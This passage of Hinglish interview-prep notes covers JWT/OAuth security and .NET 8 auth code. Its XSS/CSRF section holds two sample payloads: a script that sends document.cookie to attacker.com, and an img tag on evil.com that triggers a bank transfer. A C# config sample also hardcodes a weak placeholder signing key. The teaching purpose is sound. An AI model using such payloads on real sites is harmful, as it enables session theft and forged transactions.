A: Yeh latency-vs-revocability trade-off hai, technology preference nahi. JWT: zero network calls, excellent scalability, hard/immediate revocation, payload readable jab tak JWE na ho. Opaque + introspection: trivial revocation, per validation ek network call (short-TTL caching se mitigate karo), kuch disclosed nahi, koi offline verification nahi. High-security systems (banking, admin sessions) opaque ki taraf lean karte hain; high-throughput systems JWT ki taraf. Kaafi real systems hybridize karte hain: JWT access tokens + opaque refresh tokens.

### 4.3 JWT Validation Pitfalls: Algorithm Confusion & alg:none

**Q: `alg: none` attack aur uska fix explain karo.**

A: JWT spec `alg: none` (unsigned) allow karta hai. Agar ek verifier naively token ke apne `alg` header par trust karta hai, ek attacker signature strip karta hai aur `alg: none` set karta hai, aur server ise accept kar leta hai. Fix: token ko kabhi apna verification algorithm dictate karne mat do — expected algorithm(s) explicitly server-side pin karo (e.g. `ValidAlgorithms`) aur baaki sab reject karo including `none`.

**Q: RS256→HS256 algorithm confusion attack explain karo.**

A: Agar ek server RS256 ko public key se verify karta hai lekin uski library same key-lookup path ke through HS256 bhi accept karti hai, ek attacker `alg: HS256` token craft karta hai aur (public) RSA public key bytes ko HMAC secret ke roop mein use karta hai — ek signature produce karte hue jo server wrongly accept kar leta hai. Fix: expected algorithm aur family server-side fix karo token header se independent; symmetric/asymmetric verification paths ke across kabhi key material share mat karo.

```csharp
options.TokenValidationParameters = new TokenValidationParameters {
    ValidateIssuerSigningKey = true,
    IssuerSigningKey = signingKey,
    ValidAlgorithms = new[] { SecurityAlgorithms.RsaSha256 }, // pin explicitly
    ValidateIssuer = true, ValidateAudience = true, ValidateLifetime = true,
    ClockSkew = TimeSpan.FromMinutes(2)
};
```

**Q: Code review mein yeh kaise spot karoge?**

A: Verification code dekho jo algorithm ko token khud se padhta hai yeh decide karne ke liye ki kaise verify karna hai, code paths dekho jo ek key object use karte hain HMAC aur RSA verification dono ke liye, aur koi bhi explicit disabling of algorithm validation "library ko kaam karane ke liye."

### 4.4 CSRF, XSS, and Session Fixation — How They Interact With Auth

**Q: XSS aur CSRF define karo aur yeh auth se kaise interact karte hain.**

A: XSS — attacker ek trusted site mein JS inject karta hai jo doosre user ke browser mein execute hota hai (`document.cookie` ya `localStorage` se tokens steal kar sakta hai). CSRF — ek malicious site ek logged-in user ke browser ko trick karta hai ek unwanted request bhejne ke liye; browsers automatically cookies attach karte hain, isliye target server ko ek apparently legitimate request dikhta hai. `localStorage`/`sessionStorage` XSS-risky hain lekin CSRF-risky nahi; HttpOnly cookies opposite hain (`SameSite`/CSRF tokens chahiye).

```html
<script>
  fetch("https://attacker.com/steal?cookie=" + document.cookie);
</script>
```

```html
<!-- On evil.com, while you're logged into bank.com -->
<img src="https://bank.com/transfer?to=attacker&amount=10000" />
```

**Q: Session fixation kya hai, aur ise kaise mitigate karte ho?**

A: Ek attacker victim par login se pehle ek known session identifier force karta hai (e.g., URL-embedded session ID se); agar server successful auth ke baad ek fresh identifier issue nahi karta, attacker ka pre-known ID valid ho jaata hai jab victim login karta hai. Mitigation: successful login par hamesha session ID/token regenerate karo, URL se kabhi session IDs accept mat karo, server-generated cryptographically random HttpOnly identifiers use karo.

**Q: XSS, CSRF, aur session fixation kaise differ karte hain, synthesize karo.**

A: Yeh different layers ko target karte hain — XSS token/credential *storage* par attack karta hai, CSRF cookies mein *ambient trust* par attack karta hai, session fixation session identifiers ke *lifecycle* par attack karta hai. Har ek ko apni mitigation chahiye (CSP/sanitization; SameSite + anti-forgery tokens; login par token regeneration) — HttpOnly cookies akele XSS-token-theft solve karte hain lekin CSRF exposure reintroduce karte hain.

### 4.5 mTLS for Service-to-Service Auth

**Q: mTLS kya hai aur service-to-service auth ke liye kyun use karo?**

A: Normal TLS mein sirf server certificate present karta hai; mTLS mein client bhi ek present karta hai, isliye dono sides ek doosre ko handshake ke dauraan hi authenticate karte hain, kisi bhi app-layer token se pehle. Zero-trust internal networks (service mesh jaise Istio/Linkerd) mein useful hai har hop ko cryptographically verify karne ke liye.

**Q: mTLS ke bearer tokens ke against trade-offs kya hain, aur yeh OAuth ke saath kaise combine hota hai?**

A: Certificates ko issuance/rotation infra chahiye (aksar ek mesh sidecar se transparently handle hota hai) — ek client secret rotate karne se heavier. mTLS *service* ko authenticate karta hai, fine-grained scopes nahi — aap typically upar OAuth client credentials layer karte ho authorization ke liye. Common pattern: transport-level identity ke liye mTLS + authorization claims ke liye OAuth client credentials (defense in depth). .NET mein, Kestrel client cert validation support karta hai, lekin zyada tar production setups isse mesh/gateway ko delegate karte hain.

### 4.6 API Keys vs OAuth Client Credentials for Machine-to-Machine

**Q: M2M access ke liye API key vs OAuth Client Credentials kab use karoge?**

A: API keys prove karte hain "caller ke paas yeh static secret hai" — koi built-in expiry nahi, typically all-or-nothing scope, manual revocation, koi standard protocol nahi; simple/low-risk integrations ke liye theek hai. OAuth Client Credentials prove karta hai ek registered client authenticate hua aur ek scoped, short-lived token paya — built-in expiry, native per-client scoping, standardized (RFC 6749), more moving parts. Senior framing: API keys *identification* hain, real *authorization* nahi — security-sensitive kisi bhi cheez ke liye OAuth Client Credentials use karo.

### 4.7 Performance Considerations

**Q: JWT-based auth ke around key performance trade-offs kya hain?**

A:
- JWT per request ek DB/session lookup avoid karta hai (core win), lekin RS256/ES256 verification HS256 se zyada CPU-intensive hai, aur har revocation mitigation (blacklist, versioning, introspection) thoda I/O reintroduce karta hai.
- Large token payloads har request par network overhead add karte hain — claims minimal rakho.
- JWKS responses ko cache karna chahiye (`Cache-Control` respect karte hue) per request fetch karne ki jagah; `Authority`-based config usually yeh automatically karta hai.
- Introspection calls (opaque tokens) us model ka biggest latency cost hain — short-TTL caching se mitigate karo.
- Clock skew tolerance small rakhni chahiye (1–2 min) — bahut generous hone se effective token validity extend ho jaati hai; bahut strict hone se clock drift se spurious failures aate hain.

## 5. Best Practices

**Q: Interview mein cite karne wale top JWT/OAuth security best practices kya hain?**

A:
- JWT mein kabhi secrets/PII mat daalo — payload ko public treat karo.
- Access tokens short-lived rakho (minutes, hours nahi).
- Hamesha `iss`/`aud`/`exp`/`nbf` validate karo — `aud` skip karna cross-service token replay enable kar deta hai.
- Asymmetric signing (RS256/ES256) use karo jab multiple services tokens validate karte hain.
- Ek dedicated token-type claim (`token_use`) use karo taaki refresh tokens ko access tokens ke roop mein replay na kiya ja sake.
- Tokens mein frequently-changing roles embed karne ki jagah scopes prefer karo.
- Signing keys ko `kid` + JWKS ke through rotate karo; purani keys ko unke tokens expire hone tak rakho.
- Clock skew handle karo (1–2 minutes).
- Hamesha HTTPS use karo; query string mein kabhi tokens mat bhejo.
- Har use par refresh tokens rotate karo aur reuse detect karo.
- Logout aur credential/password change par revoke karo, sirf explicit revoke par nahi.
- Refresh/token endpoint ko rate-limit karo.
- Scattered role checks se zyada policy-based authorization prefer karo.
- Secrets ko ek managed secret store (Key Vault/Secrets Manager) mein rakho, kabhi committed `appsettings.json` mein nahi.

## 6. Common Pitfalls

### 6.1 JWT Pitfalls

**Q: Top JWT pitfalls aur unke fixes list karo.**

A:
- Long expiry → stolen tokens lambe time tak valid rehte hain; 5–30 min + refresh tokens use karo.
- No revocation strategy → logout token invalidate nahi karta; blacklist/refresh revocation/short lifetime use karo.
- Insecure storage (`localStorage`) → XSS use steal kar leta hai; HttpOnly cookies ya BFF use karo.
- Large payloads → network overhead; claims minimal rakho.
- `iss`/`aud`/`exp`/`nbf` validation skip karna → forged/misdirected tokens accept ho jaate hain.
- Weak signing keys → forgeable tokens; strong/rotated RSA/ECDSA keys use karo.
- Clock skew misconfiguration → random auth failures; 1–2 min tolerance use karo.
- Query string mein JWT → logs/history se leak hota hai; header use karo.
- No HTTPS enforcement → interceptable/replayable.
- Assume karna ki JWT encrypted hai → yeh readable hai; kabhi secrets embed mat karo.

### 6.2 OAuth Pitfalls

**Q: Top OAuth pitfalls aur unke fixes list karo.**

A:
- SPAs ke liye Implicit flow → token leakage; Authorization Code + PKCE use karo.
- Wildcard/loose redirect URI validation → hijacking; strict allow-listing use karo.
- Frontend code mein client secrets → impersonation; kabhi embed mat karo, public clients ke liye PKCE use karo.
- Over-permissioned scopes → excessive blast radius; least privilege.
- API mein missing token validation → blind trust; hamesha issuer/audience/expiry/signature validate karo.
- No refresh token rotation → replay; har use par rotate karo.
- Poor revocation strategy → stolen refresh tokens indefinitely live rehte hain.
- OAuth ko authentication se confuse karna → authentication ke liye OIDC use karo, delegated authorization ke liye OAuth.

### 6.3 Refresh Token Pitfalls

**Q: Top refresh token pitfalls aur unke fixes list karo.**

A:
- Insecure storage → XSS account takeover; HttpOnly cookies/encrypt at rest use karo.
- No rotation → stolen hone par indefinite access-token minting; har refresh par rotate karo.
- Long expiry (months) → wide attack window; 7–30 days + periodic re-login use karo.
- User/device se bound nahi → doosri device se replay; device/session fingerprint se bind karo.
- Logout/password change par no revocation → dono par explicitly revoke karo.
- Unlimited active tokens per user → session sprawl; sessions cap karo, inventory maintain karo.
- No replay detection → silent ongoing compromise; reuse detect karo, poori family revoke karo.
- Refresh endpoint rate-limited nahi → brute-force exposure; rate limit karo aur monitor karo.
- Query string se sent → logs se leak hota hai; body ya secure cookie only use karo.
- No audit logging → attacks unnoticed rehte hain; log aur monitor karo.

## 7. Implementation Reference (C#)

**Q: .NET 8 mein minimal JWT bearer setup kaisa dikhta hai?**

A: `TokenValidationParameters` ko `ValidateIssuer`, `ValidateAudience`, `ValidateLifetime`, `ValidateIssuerSigningKey` sab `true` ke saath configure karo, explicit `ValidIssuer`/`ValidAudience`/`IssuerSigningKey`, aur ek deliberate `ClockSkew` (e.g. `TimeSpan.FromMinutes(2)`, `Zero` nahi). `AddAuthentication(JwtBearerDefaults.AuthenticationScheme).AddJwtBearer(...)` se wire up karo, phir `app.UseAuthentication(); app.UseAuthorization();`.

```json
{
  "Jwt": {
    "Key": "SUPER_SECRET_KEY_12345",
    "Issuer": "MyCompany.Auth",
    "Audience": "MyCompany.Api",
    "ExpiryMinutes": 30
  }
}
```

```csharp
using Microsoft.AspNetCore.Authentication.JwtBearer;
using Microsoft.IdentityModel.Tokens;
using System.Text;

var builder = WebApplication.CreateBuilder(args);

var jwtSettings = builder.Configuration.GetSection("Jwt");
var key = Encoding.UTF8.GetBytes(jwtSettings["Key"]!);

builder.Services.AddAuthentication(JwtBearerDefaults.AuthenticationScheme)
    .AddJwtBearer(options =>
    {
        options.TokenValidationParameters = new TokenValidationParameters
        {
            ValidateIssuer = true,
            ValidateAudience = true,
            ValidateLifetime = true,
            ValidateIssuerSigningKey = true,
            ValidIssuer = jwtSettings["Issuer"],
            ValidAudience = jwtSettings["Audience"],
            IssuerSigningKey = new SymmetricSecurityKey(key),
            ClockSkew = TimeSpan.FromMinutes(2) // small, deliberate skew — not TimeSpan.Zero in most real systems
        };
    });

builder.Services.AddAuthorization();
builder.Services.AddControllers();

var app = builder.Build();

app.UseAuthentication();
app.UseAuthorization();

app.MapControllers();
app.Run();
```

**Q: Ek token service mein token kaise generate karte ho?**

A: Ek `List<Claim>` build karo (`sub`, email, role, ek dedicated `token_use: "access"` claim), `SymmetricSecurityKey` se `SigningCredentials` create karo, issuer/audience/claims/expiry ke saath ek `JwtSecurityToken` construct karo, aur `JwtSecurityTokenHandler().WriteToken(token)` se serialize karo.

```csharp
public class JwtTokenService
{
    private readonly IConfiguration _config;

    public JwtTokenService(IConfiguration config) => _config = config;

    public string GenerateToken(string userId, string email, string role)
    {
        var jwtSettings = _config.GetSection("Jwt");
        var key = Encoding.UTF8.GetBytes(jwtSettings["Key"]!);

        var claims = new List<Claim>
        {
            new(JwtRegisteredClaimNames.Sub, userId),
            new(ClaimTypes.Email, email),
            new(ClaimTypes.Role, role),
            new("token_use", "access") // dedicated type claim — prevents refresh/access confusion
        };

        var credentials = new SigningCredentials(
            new SymmetricSecurityKey(key), SecurityAlgorithms.HmacSha256);

        var token = new JwtSecurityToken(
            issuer: jwtSettings["Issuer"],
            audience: jwtSettings["Audience"],
            claims: claims,
            expires: DateTime.UtcNow.AddMinutes(int.Parse(jwtSettings["ExpiryMinutes"]!)),
            signingCredentials: credentials);

        return new JwtSecurityTokenHandler().WriteToken(token);
    }
}
```

**Q: Ek hi login endpoint se browser (cookie) aur Postman/mobile (header) dono clients ko kaise support karte ho?**

A: Login par, ek HttpOnly/Secure/SameSite cookie (`access_token`) set karo **aur** token ko JSON body mein return karo. `JwtBearerEvents.OnMessageReceived` mein, pehle `Authorization` header check karo (Postman/mobile), phir cookie par fallback karo (browser) — controllers ko koi special handling nahi chahiye kisi bhi tarah se (`[Authorize]` bas kaam karta hai).

```csharp
[HttpPost("login")]
public IActionResult Login(LoginRequest request)
{
    if (!IsValidUser(request)) return Unauthorized();

    var token = _tokenService.GenerateToken("1", "admin@test.com", "Admin");

    // Browser support
    Response.Cookies.Append("access_token", token, new CookieOptions
    {
        HttpOnly = true,
        Secure = true,
        SameSite = SameSiteMode.Strict,
        Expires = DateTime.UtcNow.AddMinutes(30)
    });

    // Postman/mobile support
    return Ok(new { access_token = token });
}
```

```csharp
.AddJwtBearer(options =>
{
    options.Events = new JwtBearerEvents
    {
        OnMessageReceived = context =>
        {
            // Priority 1: Authorization header (Postman/mobile)
            var authHeader = context.Request.Headers["Authorization"].FirstOrDefault();
            if (!string.IsNullOrEmpty(authHeader) && authHeader.StartsWith("Bearer "))
            {
                context.Token = authHeader["Bearer ".Length..];
            }
            // Priority 2: cookie (browser)
            else if (context.Request.Cookies.TryGetValue("access_token", out var cookieToken))
            {
                context.Token = cookieToken;
            }
            return Task.CompletedTask;
        }
    };
});
```

Controllers ko koi special handling nahi chahiye kisi bhi tarah se:
```csharp
[Authorize]
[HttpGet("orders")]
public IActionResult GetOrders() => Ok("Secure Data");
```

**Q: Rotation + reuse detection ke saath ek refresh endpoint conceptually kaisa dikhta hai?**

A: Stored refresh token lookup karo; agar missing/expired/already consumed hai, reject karo — aur agar wo already consumed tha, poora token family revoke karo (possible theft). Otherwise ek naya access token + naya refresh token issue karo, aur purane refresh token ko consumed mark karo naye se link karte hue.

```csharp
var savedToken = _refreshTokenStore.Get(request.RefreshToken);
if (savedToken is null || savedToken.IsExpired || savedToken.IsConsumed) {
    if (savedToken?.IsConsumed == true) _refreshTokenStore.RevokeFamily(savedToken.FamilyId);
    return Unauthorized();
}
```

**Q: JWT auth ke liye production settings checklist (source notes ke according) mein kya hona chahiye?**

A: HTTPS hamesha enforced; CORS configured taaki cookie flow ke liye credentials allow ho; `SameSite=Strict/Lax` same-domain ya `None; Secure` cross-domain; jab bhi cookies use ho CSRF protection; access token expiry 10–30 minutes ek refresh token ke saath seamless re-auth ke liye.

**Q: Policy-based authorization registration kaisa dikhta hai?**

A: Policy ko ek baar centrally register karo, phir controllers/endpoints par declaratively reference karo.

```csharp
builder.Services.AddAuthorization(options =>
{
    options.AddPolicy("ITOnly", policy => policy.RequireClaim("Department", "IT"));
});

[Authorize(Policy = "ITOnly")]
public IActionResult InternalData() => Ok();
```

## 8. Sample Interview Q&A

**Q: JWT validation internally kaise kaam karta hai? (interview-ready synthesis)**

A: Header/cookie se token extract karo → trusted JWKS se `kid` se key select karo → server-configured algorithm se signature verify karo (token ke apne `alg` se kabhi nahi) → `exp`/`nbf`/`iss`/`aud` validate karo thode clock skew ke saath → claims ko `HttpContext.User` mein materialize karo → authorization stage roles/policies evaluate karta hai → koi bhi failure par reject karo.

**Q: Authentication vs Authorization, one line mein har ek failure code ke saath?**

A: Authentication = "tum ho kaun" → failure par 401. Authorization = "tum kya kar sakte ho" → failure par 403.

**Q: Basic Auth insecure kyun hai, one line mein?**

A: Credentials har request travel karte hain, Base64 ≠ encryption, koi expiry/revocation nahi, capture hone par replayable — HTTPS mandate karo, sirf legacy compatibility ke liye use karo.

**Q: JWTs ko revoke kaise karte ho, one line mein?**

A: Koi native revocation nahi (stateless) — state add karo short expiry, `jti` blacklist, token versioning, refresh-token revocation, ya signing-key rotation se; har ek kuch statelessness trade away karta hai.

**Q: JWT vs OAuth, one line mein?**

A: JWT ek token format hai; OAuth 2.0 tokens obtain/use karne ke liye ek authorization framework hai. OAuth commonly JWT ko apne token format ke roop mein use karta hai lekin yeh interchangeable concepts nahi hain.

**Q: Windows Authentication kab use karna chahiye?**

A: Internal enterprise apps ek AD domain ke andar jinhe SSO chahiye; public/internet-facing APIs ke liye unsuitable (Kerberos/NTLM se tie karta hai, koi external client support nahi).

**Q: Microservices communication ko kaise secure karte ho?**

A: Services ke beech JWT (service-specific `aud`), transport-level identity ke liye mTLS, API-gateway-level validation, network isolation — typically mTLS + JWT combined, either/or nahi.

**Q: Claims vs Roles — kaun better hai?**

A: Claims fine-grained, scalable control dete hain; roles coarse hote hain aur combinatorially multiply hote hain. Production default: claims (aur roles jaha useful ho) se banti policy-based authorization, decision logic ko centralize karte hue.

**Q: Frontend par token expiration kaise handle karte ho?**

A: Short-lived access tokens + refresh-token flow + ek interceptor ke through silent refresh, taaki user re-login se interrupt na ho.

**Q: Token replay attacks kaise prevent karte ho?**

A: HTTPS everywhere, short token lifetime, secret/key rotation, feasible ho to device binding, aur critical state-changing operations ke liye nonce/idempotency-key tracking regardless of token validity.

**Q: PKCE confidential clients ke liye bhi kyun recommended hai?**

A: Yeh redirect step par authorization-code interception se defend karta hai client type ke regardless, aur "hamesha PKCE use karo" ek conditional rule se simpler/safer guidance hai, koi real operational cost ke bina.

**Q: Algorithm confusion attack ke through briefly walk karo.**

A: Server public key se RS256 verify karta hai lekin uski library same key path ke through HS256 bhi accept karti hai; attacker public RSA key bytes ko HMAC secret ke roop mein use karke ek HS256 token craft karta hai, ek signature produce karte hue jo server wrongly accept kar leta hai. Fix: algorithm server-side pin karo, kabhi token ke `alg` par trust mat karo, symmetric/asymmetric paths ke across kabhi key material share mat karo.

**Q: BFF pattern kya hai, briefly?**

A: SPA sirf apne backend ke saath ek session cookie hold karta hai, jo OAuth dance server-side karta hai aur kabhi browser ko token expose nahi karta — extra backend component ki cost par "JS mein token kaha store karu" wala problem remove karta hai.

**Q: Refresh token reuse detection kaise design karoge, briefly?**

A: Tokens ko use ke baad "consumed" mark karo, delete nahi; ek consumed token present karna theft signal karta hai — poora token family revoke karo aur re-authentication force karo, even though yeh legitimate user ko bhi log out kar deta hai.
